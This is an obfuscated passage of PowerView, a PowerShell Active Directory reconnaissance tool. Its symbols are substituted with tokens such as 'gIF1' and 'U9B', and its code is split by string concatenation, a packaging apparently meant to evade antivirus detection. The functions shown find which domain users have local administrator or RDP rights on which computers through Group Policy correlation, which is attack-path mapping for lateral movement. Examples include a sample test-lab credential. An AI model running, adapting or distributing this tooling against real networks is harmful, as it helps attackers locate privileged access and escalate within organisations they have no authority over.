                                gIF1GroupSID = gIF1Null
                            }
                        }
                    }

                    gIF1GPOGroup = New-Object PSObject
                    gIF1GPOGroup U9B Add-Member Noteproperty 41aGPODisplayName41a gIF1GPODisplayName
                    gIF1GPOGroup U9B Add-Member Noteproperty 41aGPOName41a gIF1GPOName
                    gIF1GPOGroup U9B Add-Member Noteproperty 41aGPOPath41a gIF1GPOPath
                    gIF1GPOGroup U9B Add-Member Noteproperty 41aGPOType41a 41aRestrictedGroups41a
                    gIF1GPOGroup U9B Add-Member Noteproperty 41aFilters41a gIF1Null
                    gIF1GPOGroup U9B Add-Member Noteproperty 41aGroupName41a gIF1GroupName
                    gIF1GPOGroup U9B Add-Member Noteproperty 41aGroupSID41a gIF1GroupSID
                    gIF1GPOGroup U9B Add-Member Noteproperty 41aGroupMemberOf41a gIF1Membership.Value.Memberof
                    gIF1GPOGroup U9B Add-Member Noteproperty 41aGroupMembers41a gIF1Membership.Value.Members
                    gIF1GPOGroup.PSObject.TypeNames.Insert(0, 41aPowerView.GPOGroup41a)
                    gIF1GPOGroup
                }
            }

            # now try to the parse group policy preferences file (Groups.xml) if it exists
            gIF1ParseArgs =  @{
                41aGroupsXMLpath41a = ZfrgIF1GPOPathYwWMACHINEYwWPreferencesYwWGroupsYwWGroups.xmlZfr
            }

            Get-GroupsXML @ParseArgs U9B ForEach-Object {
                if (gIF1PSBoundParameters[41aResolveMembersToSIDs41a]) {
                    gIF1GroupMembers = @()
                    ForEach (gIF1Member in gIF1_.GroupMembers) {
                        if (gIF1Member -and (gIF1Member.Trim() -ne 41a41a)) {
                            if (gIF1Member -notmatch 41a^S-1-.*41a) {

                                # if the resulting member is username and not a SID, attempt to resolve it
                                gIF1ConvertToArguments = @{41aObjectName41a = gIF1Groupname}
                                if (gIF1PSBoundParameters[41aDomain41a]) { gIF1ConvertToArguments[41aDomain41a] = gIF1Domain }
                                gIF1MemberSID = ConvertTo-SID -Domain gIF1Domain -ObjectName gIF1Member

                                if (gIF1MemberSID) {
                                    gIF1GroupMembers += gIF1MemberSID
                                }
                                else {
                                    gIF1GroupMembers += gIF1Member
                                }
                            }
                            else {
                                gIF1GroupMembers += gIF1Member
                            }
                        }
                    }
                    gIF1_.GroupMembers = gIF1GroupMembers
                }

                gIF1_ U9B Add-Member Noteproperty 41aGPODisplayName41a gIF1GPODisplayName
                gIF1_ U9B Add-Member Noteproperty 41aGPOName41a gIF1GPOName
                gIF1_ U9B Add-Member Noteproperty 41aGPOType41a 41aGroupPolicyPreferences41a
                gIF1_.PSObject.TypeNames.Insert(0, 41aPowerView.GPOGroup41a)
                gIF1_
            }
        }
    }
}


functi'+'on Get-DomainGPOUserLocalGroupMapping {
<#
.SYNOPSIS

Enumerates the machines where a specific domain user/group is a member of a specific
local group, all through GPO correlation. If no user/group is specified, all
discoverable mappings are returned.

Author: @harmj0y  
License: BSD 3-Clause  
Required Dependencies: Get-DomainGPOLocalGroup, Get-DomainObject, Get-DomainComputer, Get-DomainOU, Get-DomainSite, Get-DomainGroup  

.DESCRIPTION

Takes a user/group name and optional domain, and determines the computers in the domain
the user/group has local admin (or RDP) rights to.

It does this by:
    1.  resolving the user/group to its proper SID
    2.  enumerating all groups the user/group is a current part of
        and extracting all target SIDs to build a target SID list
    3.  pulling all GPOs that set 41aRestricted Groups41a or Groups.xml by calling
        Get-DomainGPOLocalGroup
    4.  matching the target SID list to the queried GPO SID list
        to enumerate all GPO the user is effectively applied with
    5.  enumerating all OUs and sites and applicable GPO GUIs are
        applied to through gplink enumerating
    6.  querying for all computers under the given OUs or sites

If no user/group is specified, all user/group -> machine mappings discovered through
GPO relationships are returned.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
for the user/group to identity GPO local group mappings for.

.PARAMETER LocalGroup

The local group to check access against.
Can be ZfrAdministratorsZfr (S-1-5-32-544), ZfrRDP/Remote Desktop UsersZfr (S-1-5-32-555),
or a custom local SID. Defaults to local 41aAdministrators41a.

.PARAMETER Domain

Specifies the domain to enumerate GPOs for, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainGPOUserLocalGroupMapping

Find all user/group -> machine relationships where the user/group is a member
of the local administrators group on target machines.

.EXAMPLE

Get-DomainGPOUserLocalGroupMapping -Identity dfm -Domain dev.testlab.local

Find all computers that dfm user has local administrator rights to in
the dev.testlab.local domain.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-DomainGPOUserLocalGroupMapping -Credential gIF1Cred

.OUTPUTS

PowerView.GPOLocalGroupMapping

A custom PSObject containing any target identity information and what local
group memberships they41are a part of through GPO correlation.

.LINK

http://www.harmj0y.net/blog/redteaming/where-my-admins-at-gpo-edition/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aPowerView.GPOUserLocalGroupMapping41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aDistinguishedName41a, 41aSamAccountName41a, 41aName41a)]
        [String]
        gIF1Identity,

        [String]
        [ValidateSet(41aAdministrators41a, 41aS-1-5-32-54441a, 41aRDP41a, 41aRemote Desktop Users41a, 41aS-1-5-32-55541a)]
        gIF1LocalGroup = 41aAdministrators41a,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aADSPath41a)]
        [String]
        gIF1SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

'+'
        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [Switch]
        gIF1Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        gIF1CommonArguments = @{}
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1CommonArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1CommonArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1CommonArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1CommonArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1CommonArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aTombs'+'tone41a]) { gIF1CommonArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1CommonArguments[41aCredential41a] = gIF1Credential }
    }

    PROCESS {
        gIF1TargetSIDs = @()

        if (gIF1PSBoundParameters[41aIdentity4'+'1a]) {
            gIF1TargetSIDs += Get-DomainObject @CommonArguments -Identity gIF1Identity U9B Select-Object -Expand objectsid
            gIF1TargetObjectSID = gIF1TargetSIDs
            if (-not gIF1TargetSIDs) {
                Throw Zfr[Get-DomainGPOUserLocalGroupMapping] Unable to retrieve SID for identity 41agIF1Identity41aZfr
            }
        }
        else {
            # no filtering/match all
            gIF1TargetSIDs = @(41a*41a)
        }

        if (gIF1LocalGroup -match 41aS-1-541a) {
            gIF1TargetLocalSID = gIF1LocalGroup
        }
        elseif (gIF1LocalGroup -match 41aAdmin41a) {
            gIF1TargetLocalSID = 41aS-1-5-32-54441a
        }
        else {
            # RDP
            gIF1TargetLocalSID = 41aS-1-5-32-55541a
        }

        if (gIF1TargetSIDs[0] -ne 41a*41a) {
            ForEach (gIF1TargetSid in gIF1TargetSids) {
                Write-Verbose Zfr[Get-DomainGPOUserLocalGroupMapping] Enumerating nested group memberships for: 41agIF1TargetSid41aZfr
                gIF1TargetSIDs += Get-DomainGroup @CommonArguments -Properties 41aobjectsid41a -MemberIdentity gIF1TargetSid U9B Select-Object -ExpandProperty objectsid
            }
        }

        Write-Verbose Zfr[Get-DomainGPOUserLocalGroupMapping] Target localgroup SID: gIF1TargetL'+'ocalSIDZfr
        Write-Verbose Zfr[Get-DomainGPOUserLocalGroupMapping] Effective target domain SIDs: gIF1TargetSIDsZfr

        gIF1GPOgroups = Get-DomainGPOLocalGroup @CommonArguments -ResolveMembersToSIDs U9B ForEach-Object {
            gIF1GPOgroup = gIF1_
            # if the locally set group is what we41are looking for, check the GroupMembers (41amembers41a) for our target SID
            if (gIF1GPOgroup.GroupSID -match gIF1TargetLocalSID) {
                gIF1GPOgroup.GroupMembers U9B Where-Object {gIF1_} U9B ForEach-Object {
                    if ( (gIF1TargetSIDs[0] -eq 41a*41a) -or (gIF1TargetSIDs -Contains gIF1_) ) {
                        gIF1GPOgroup
                    }
                }
            }
            # if the group is a 41amemberof41a the group we41are looking for, check GroupSID against the targt SIDs
            if ( (gIF1GPOgroup.GroupMemberOf -contains gIF1TargetLocalSID) ) {
                if ( (gIF1T'+'argetSIDs[0] -eq 41a*41a) -or (gIF1TargetSIDs -Contains gIF1GPOgroup.GroupSID) ) {
                    gIF1GPOgroup
                }
            }
        } U9B Sort-Object -Property GPOName -Unique

        gIF1GPOgroups U9B Where-Object {gIF1_} U9B ForEach-Object {
            gIF1GPOname = gIF1_.GPODisplayName
            gIF1GPOguid = gIF1_.GPOName
            gIF1GPOPath = gIF1_.GPOPath
            gIF1GPOType = gIF1_.GPOType
            if (gIF1_.GroupMembers) {
                gIF1GPOMembers = gIF1_.GroupMembers
            }
            else {
                gIF1GPOMembers = gIF1_.GroupSID
            }

            gIF1Filters = gIF1_.Filters

            if (gIF1TargetSIDs[0] -eq 41a*41a) {
                # if the * wildcard was used, set the targets to all GPO members so everything it output
                gIF1TargetObjectSIDs = gIF1GPOMembers
            }
            else {
'+'                gIF1TargetO'+'bjectSIDs = gIF1TargetObjectSID
            }

            # find any OUs that have this GPO linked through gpLink
            Get-DomainOU @CommonArguments -Raw -Properties 41aname,distinguishedname41a -GPLink gIF1GPOGuid U9B ForEach-Object {
                if (gIF1Filters) {
                    gIF1OUComputers = Get-DomainComputer @CommonArguments -Properties 41adnshostname,distinguishedname41a -SearchBase gIF1_.Path U9B Where-Object {gIF1_.distinguishedname -match (gIF1Filters.Value)} U9B Select-Object -ExpandProperty dnshostname
                }
                else {
                    gIF1OUComputers = Get-DomainComputer @CommonArguments -Properties 41adnshostname41a -SearchBase gIF1_.Path U9B Select-Object -ExpandProperty dnshostname
                }

                if (gIF1OUComputers) {
                    if (gIF1OUComputers -isnot [System.Array]) {gIF1OUComputers = @(gIF1OUComputers)}

                    ForEach (gIF1TargetSid in gIF1TargetObjectSIDs) {
                        gIF1Object = Get-DomainObje'+'ct @CommonArguments -Identity gIF1TargetSid -Properties 41asamaccounttype,samaccountname,distinguishedname,objectsid41a

                        gIF1IsGroup = @(41a26843545641a,41a26843545741a,41a53687091241a,41a53687091341a) -contains gIF1Object.samaccounttype

                        gIF1GPOLocalGroupMapping = New-Object PSObject
                        gIF1GPOLocalGroupMapping U9B Add-Member Noteproperty 41aObjectName41a gIF1Object.samaccountname
                        gIF1GPOLocalGroupMapping U9B Add-Member Noteproperty 41aObjectDN41a gIF1Object.distinguishedname
                        gIF1GPOLocalGroupMapping U9B Add-Member Noteproperty 41aObjectSID41a gIF1Object.objectsid
                        gIF1GPOLocalGroupMapping U9B Add-Member Noteproperty 41aDomain41a gIF1Domain
                        gIF1GPOLocalGroupMapping U9B Add-Member Noteproperty 41aIsGroup41a gIF1IsGroup
                        gIF1GPOLocalGroupMapping U9B Add-Member Noteproperty 41aGPODisplayName41a gIF1GPOname
                        gIF1GPOLocalGroupMapping U9B Add-Member Noteproperty 41aGPOGuid41a gIF1GPOGuid
                        gIF1GPOLocalGroupMapping U9B Add-Member Noteproperty 41aGPOPath41a gIF1GPOPath
                        gIF1GPOLocalGroupMapping U9B Add-Member Noteproperty 41aGPOType41a gIF1GPOType
                        gIF1GPOLocalGroupMapping U9B Add-Member Noteproperty 41aContainerName41a gIF1_.Properties.distinguishedname
                        gIF1GPOLocalGroupMapping U9B Add-Member Noteproperty 41aComputerName41a gIF1OUComputers
     '+'                   gIF1GPOLocalGroupMapping.PSObject.TypeNames.Insert(0, 41aPowerView.GPOLocalGroupMapping41a)
                        gIF1GPOLocalGroupMapping
                    }
                }
            }

            # find any sites that have this GPO linked through gpLink
            Get-DomainSite @CommonArguments -Properties 41asiteobjectbl,distinguishedname41a -GPLink gIF1GPOGuid U9B ForEach-Object {
                ForEach (gIF1TargetSid in gIF1TargetObjectSIDs) {
                    gIF1Object = Get-DomainObject @CommonArguments -Identity gIF1TargetSid -Properties 41asamaccounttype,samaccountname,distinguishedname,objectsid41a

                    gIF1IsGroup = @(41a26843545641a,41a26843545741a,41a53687091241a,41a53687091341a) -contains gIF1Object.samaccounttype

                    gIF1GPOLocalGroupMapping = New-Object PSObject
                    gIF1GPOLocalGroupMapping U9B Add-Member Noteproperty 41aObjectName41a gIF1Object.samaccountname
                    gIF1GPOLocalGroupMapping U9B Add-Member Noteproperty 41aObjectDN41a gIF1Object.distinguishedname
                    gIF1GPOLocalGroupMapping U9B Add-Member Noteproperty 41aObjectSID41a gIF1Object.objectsid
                    gIF1GPOLocalGroupMapping U9B Add-Member Noteproperty 41aIsGroup41a gIF1IsGroup
                    gIF1GPOLocalGroupMapping U9B Add-Member Noteproperty 41aDomain41a gIF1Domain
                    gIF1GPOLocalGroupMapping U9B Add-Member Noteproperty 41aGPODisplayName41a gIF1GPOname
                    gIF1GPOLocalGroupMapping U9B Add-Member Noteproperty 41aGPOGuid41a gIF1GPOGuid
                    gIF1GPOLocalGroupMapping U9B Add-'+'Member Noteproperty 41aGPOPath41a gIF1GPOPath
                    gIF1GPOLocalGroupMapping U9B Add-Member Noteproperty 41aGPOType41a gIF1GPOType
                    gIF1GPOLocalGroupMapping U9B Add-Member Noteproperty 41aContainerName41a gIF1_.distinguishedname
                    gIF1GPOLocalGroupMapping U9B Add-Member Noteproperty 41aComputerName41a gIF1_.siteobjectbl
                    gIF1GPOLocalGroupMapping.PSObject.TypeNames.Add(41aPowerView.GPOLocalGroupMapping41a)
                    gIF1GPOLocalGroupMapping
                }
            }
        }
    }
}


function Get-DomainGPOComputerLocalGroupMapping {
<#
.SYNOPSIS

Takes a computer (or GPO) object and determines what users/groups are in the specified
local group for the machine through GPO correlation.

Author: @harmj0y  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Get-DomainOU, Get-NetComputerSiteName, Get-DomainSite, Get-DomainGPOLocalGroup  

.DESCRIPTION

This function is the inverse of Get-DomainGPOUserLocalGroupMapping, and finds what users/groups
are in the specified local group for a target machine through GPO correlation.

If a -ComputerIdentity is specified, retrieve the complete computer object, attempt to
determine the OU the computer is a part of. Then resolve the computer41as site name with
Get-NetCom'+'puterSiteName and retrieve all sites object Get-DomainSite. For those results, attempt to
enumerate all linked GPOs and associated local group settings with Get-DomainGPOLocalGroup. For
each resulting GPO group, resolve the resulting user/group name to a full AD object and
return the results. This will return the domain objects that are members of the specified
-LocalGroup for the given computer.

Otherwise, if -OUIdentity is supplied, the same process is executed to find linked GPOs and
localgroup specifications.

.PARAMETER ComputerIdentity

A SamAccountName (e.g. WINDOWS10gIF1), DistinguishedName (e.g. CN=WINDOWS10,CN=Computers,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1124), GUID (e.g. 4f16b6bc-7010-4cbf-b628-f3cfe20f6994),
or a dns host name (e.g. windows10.testlab.local) for the computer to identity GPO local group mappings for.

.PARAMETER OUIdentity

An OU name (e.g. TestOU), DistinguishedName (e.g. OU=TestOU,DC=testlab,DC=local), or
GUID (e.g. 8a9ba22a-8977-47e6-84ce-8c26af4e1e6a) for the OU to identity GPO local group mappings for.

.PARAMETER LocalGroup

The local group to check access against.
Can be ZfrAdministratorsZfr (S-1-5-32-544), ZfrRDP/Remote Desktop UsersZfr (S-1-5-32-555),
or a custom local SID. Defaults to local 41aAdministrators41a.

.PARAMETER Domain

Specifies the domain to enumerate GPOs for, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainGPOComputerLocalGroupMapping -ComputerName WINDOWS3.testlab.local

Finds users who have local admin rights over WINDOWS3 through GPO correlation.

.EXAMPLE

Get-DomainGPOComputerLocalGroupMapping -Domain dev.testlab.local -ComputerName WINDOWS4.dev.testlab.local -LocalGroup RDP

Finds users who have RDP rights over WINDOWS4 through GPO correlation.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-DomainGPOComputerLocalGroupMapping -Credential gIF1Cred -ComputerIdentity SQL.testlab.local

.OUTPUTS

PowerView.GGPOComputerLocalGroupMember
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aPowerView.GGPOComputerLocalGroupMember41a)]
    [CmdletBinding(DefaultParameterSetName = 41aComputerIdentity41a)]
    Param(
        [Parameter(Position = 0, ParameterSetName = 41aComputerIdentity41a, Mandatory = gIF1True, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aComputerName41a, 41aComputer41a, 41aDistinguishedName41a, 41aSamAccountName41a, 41aName41a)]
        [String]
        gIF1ComputerIdentity,

        [Parameter(Mandatory = gIF1True, ParameterSetName = 41aOUIdentity41a)]
        [Alias(41aOU41a)]
        [String]
        gIF1OUIdentity,

        [String]
        [ValidateSet(41aAdministrators41a, 41aS-1-5-32-54441a, 41aRDP41a, 41aRemote Desktop Users41a, 41aS-1-5-32-55541a)]
        gIF1LocalGroup = 41aAdministrators41a,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aADSPath41a)]
        [String]
        gIF1SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRan'+'ge(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [Switch]
        gIF1Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        gIF1CommonArguments = @{}
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1CommonArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1CommonArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1CommonArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1CommonArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1CommonArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1CommonArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1CommonArguments[41aCredential41a] = gIF1Credential }
    }

    PROCESS {
        if (gIF1PSBoundParameters[41aComputerIdentity41a]) {
            gIF1Computers = Get-'+'DomainComputer @CommonArguments -Identity gIF1ComputerIdentity -Properties 41adistinguishedname,dnshostname41a

            if (-not gIF1Computers) {
                throw Zfr[Get-DomainGPOComputerLocalGroupMapping] Computer gIF1ComputerIdentity not found. Try a fully qualified host name.Zfr
            }

            ForEach (gIF1Computer in gIF1Computers) {

                gIF1GPOGuids = @()

                # extract any GPOs linked to this computer41as OU through gpLink
                gIF1DN = gIF1Computer.distinguishedname
                gIF1OUIndex = gIF1DN.IndexOf(41aOU=41a)
                if (gIF1OUIndex -gt 0) {
                    gIF1OUName = gIF1DN.SubString(gIF1OUIndex)
                }
                if (gIF1OUName) {
                    gIF1GPOGuids += Get-DomainOU @CommonArguments -SearchBase gIF1OUName -LDAPFilter 41a(gplink=*)41a U9B ForEach-Object {
                        Select-String -InputObject gIF1_.gplink -Pattern 41a(YwW{){0,1}[0-9a-fA-F]{8}YwW-[0-9a-fA-F]{4}YwW-[0-9a-fA-F]{4}YwW-[0-9a-fA-F]{4}YwW-[0-9a-fA-F]{12}(YwW}){0,1}41a -AllMatches U9B ForEach-Object {gIF1_.Matches U9B Select-Object -ExpandProperty Value }
                    }
                }

                # extract any GPOs linked to this computer41as site through gpLink
                Write-Verbose ZfrEnumerating the sitename for: gIF1(gIF1Computer.dnshostname)Zfr
                gIF1ComputerSite = (Get-NetComputerSiteName -ComputerName gIF1Computer.dnshostname).SiteName
                if (gIF1ComputerSite -and (gIF1ComputerSite -notmatch 41aError41a)) {
                    gIF1GPOGuids += Get-DomainSite @CommonArguments -Identity gIF1ComputerSite -LDAPFilter 41a(gplink=*)41a U9B ForEach-Object {
                        Select-String -InputObject gIF1_.gplink -Pattern 41a(YwW{){0,1}[0-9a-fA-F]{8}YwW-[0-9a-fA-F]{4}YwW-[0-9a-fA-F]{4}YwW-[0-9a-fA-F]{4}YwW-[0-9a-fA-F]{12}(YwW}){0,1}41a -AllMatches U9B ForEach-Object {gIF1_.Matches'+' U9B Select-Object -ExpandProperty Value }
                    }
                }

                # process any GPO local group settings from the GPO GUID set
                gIF1GPOGuids U9B Get-DomainGPOLocalGroup @CommonArguments U9B Sort-Object -Property GPOName -Unique U9B ForEach-Object {
                    gIF1GPOGroup = gIF1_

                    if(gIF1GPOGroup.GroupMembers) {
        '+'                gIF1GPOMembers = gIF1GPOGroup.GroupMembers
                    }
                    else {
                        gIF1GPOMembers = gIF1GPOGroup.GroupSID
                    }

                    gIF1GPOMembers U9B ForEach-Object {
                        gIF1Object = Get-DomainObject @CommonArguments -Identity gIF1_
                        gIF1IsGroup = @(41a26843545641a,41a26843545741a,41a53687091241a,41a53687091341a) -contains gIF1Object.samaccounttype

'+'                        gIF1GPOComputerLocalGroupMember = New-Object PSObject
                        gIF1GPOComputerLocalGroupMember U9B Add-Member Noteproperty 41aComputerName41a gIF1Computer.dnshostname
                        gIF1GPOComputerLocalGroupMember U9B Add-Member Noteproperty 41aObjectName41a gIF1Object.samaccountname
                        gIF1GPOComputerLocalGroupMember U9B Add-Member Noteproperty 41aObjectDN41a gIF1Object.distinguishedname
                        gIF1GPOComputerLocalGroupMember U9B Add-Member Noteproperty 41aObjectSID41a gIF1_
                        gIF1GPOComputerLocalGroupMember U9B Add-Member Noteproperty 41aIsGroup41a gIF1IsGroup
                        gIF1GPOComputerLocalGroupMember U9B Add-Member Noteproperty 41aGPODisplayName41a gIF1GPOGroup.GPODisplayName
                        gIF1GPOComputerLocalGroupMember U9B Add-Member Noteproperty 41aGPOGuid41a gIF1GPOGroup.GPOName
                        gIF1GPOComputerLocalGroupMember U9B Add-Member Noteproperty 41aGPOPath41a gIF1GPOGroup.GPOPath
                        gIF1GPOComputerLocalGroupMember U9B Add-Member Noteproperty 41aGPOType41a gIF1GPOGroup.GPOType
                        gIF1GPOComputerLocalGroupMember.PSObject.TypeNames.Add(41aPowerView.GPOComputerLocalGroupMember41a)
                        gIF1GPOComputerLocalGroupMember
                    }
                }
            }
        }
    }
}


function Get-DomainPolicyData {
<#
.SYNOPSIS

Returns the default domain policy or the domain controller policy for the current
domain or a specified domain/domain controller.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainGPO, Get-GptTmpl, ConvertFrom-SID  

.DESCRIPTION

Returns the default domain policy or the domain controller policy for the current
domain or a specified domain/domain controller using Get-DomainGPO.

.PARAMETER Domain
'+'
The domain to query for default policies, defaults to the current domain.

.PARAMETER Policy

Extract 41aDomain41a, 41aDC41a'+' (domain controller) policies, or 41aAll41a for all policies.
Otherwise queries for the particular GPO name or GUID.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainPolicyData

Returns the default domain policy for the current domain.

.EXAMPLE

Get-DomainPolicyData -Domain dev.testlab.local

Returns the default domain policy for the dev.testlab.local domain.

.EXAMPLE

Get-DomainGPO U9B Get-DomainPolicy

Parses any GptTmpl.infs found for any policies in the current domain.

.EXAMPLE

Get-DomainPolicyData -Policy DC -Domain dev.testlab.local

Returns the policy for the dev.testlab.local domain controller.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword12'+'3!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-DomainPolicyData -Credential gIF1Cred

.OUTPUTS

Hashtable

Ouputs a hashtable representing the parsed GptTmpl.inf file.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aSource41a, 41aName41a)]
        [String]
        gIF1Policy = 41aDomain41a,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        gIF1SearcherArguments = @{}
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1SearcherArguments[41aServer41a] = gIF1Server '+'}
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1SearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1SearcherArguments[41aCredential41a] = gIF1Credential }

        gIF1ConvertArguments = @{}
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1ConvertArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1ConvertArguments[41aCredential41a] = gIF1Credential }
  '+'  }

    PROCESS {
        if (gIF1PSBoundParameters[41aDomain41a]) {
            gIF1SearcherArguments[41aDomain41a] = gIF1Dom'+'ain
            gIF1ConvertArguments[41aDomain41a] = gIF1Domain
        }

        if (gIF1Policy -eq 41aAll41a) {
            gIF1SearcherArguments[41aIdentity41a] = 41a*41a
        }
        elseif (gIF1Policy -eq 41aDomain41a) {
            gIF1SearcherArguments[41aIdentity41a] = 41a{31B2F340-016D-11D2-945F-00C04FB984F9}41a
        }
        elseif ((gIF1Policy -eq 41aDomainController41a) -or (gIF1Policy -eq 41aDC41a)) {
            gIF1SearcherArguments[41aIdentity41a] = 41a{6AC1786C-016F-11D2-945F-00C04FB984F9}41a
        }
        else {
            gIF1SearcherArguments[41aIdentity41a] = gIF1Policy
        }

        gIF1GPOResults = Get-DomainGPO @SearcherArguments

        ForEach (gIF1GPO in gIF1GPOResults) {
            # grab the GptTmpl.inf file and parse it
            gIF1GptTmplPath = gIF1GPO.gpcfilesyspath + ZfrYwWMACHINEYwWMicrosoftYwWWindows NTYwWSecEditYwWGptTmpl.infZfr

            gIF1ParseArgs =  @{
                41aGptTmplPath41a = gIF1GptTmplPath
                41aOutputObject41a = gIF1True
            }
            if (gIF1PSBoundParameters[41aCredential41a]) { gIF1ParseArgs[41aCredential41a] = gIF1Credential }

            # parse the GptTmpl.inf
            Get-GptTmpl @ParseArgs U9B ForEach-Object {
                gIF1_ U9B Add-Member Noteproperty 41aGPON'+'ame41a gIF1GPO.name
                gIF1_ U9B Add-Member Noteproperty 41aGPODisplayName41a gIF1GPO.displayname
                gIF1_
            }
        }
    }
}


########################################################
#
# Functions that enumerate a single host, either through
# WinNT, WMI, remote registry, or API calls
